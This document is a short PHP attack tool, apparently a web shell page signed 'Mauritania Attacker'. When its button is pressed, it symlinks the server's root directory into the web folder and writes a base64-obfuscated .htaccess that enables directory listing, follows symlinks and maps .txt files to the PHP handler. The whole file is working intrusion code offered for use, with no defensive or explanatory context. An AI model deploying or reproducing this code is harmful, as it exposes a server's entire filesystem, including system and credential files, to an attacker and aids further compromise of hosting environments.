<head>
<title>Bypass Bypass Root Path by Mauritania Attacker</title>
</head><link rel="shortcut icon" href="http://www.iconj.com/ico/c/u/cu1bmpgb1k.ico" type="image/x-icon" />
<style type="text/css"><!-- body {background-color: transparent; font-family:Courier	margin-left: 0px; margin-top: 0px; text-align: center; New;font-size:12px;color:#008800;font-weight:400;} a{text-decoration:none;} a:link {color:#009900;} a:visited {color:#008800;} a:hover{color:#00bb00;} a:active {color:#009900;} --><!-- Made By Mauritania Attacker -->
</style><br><br><body bgColor="000000"><tr><td><?php echo "<form method='POST' action=''>" ; 
echo "<center><input type='submit' value='Bypass it' name='shell_execer'></center>"; 
if (isset($_POST['shell_execer'])){ shell_exec('ln -s / root-shell_exec.txt'); 
$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $shell_execer = symlink("/","root-shell_exec.txt"); 
$rt="<br><a href=root-shell_exec.txt TARGET='_blank'><font color=#00bb00 size=2 face='Courier New'><b>Bypassed Successfully</b></font></a>"; 
echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";  ?></td></tr></body></html>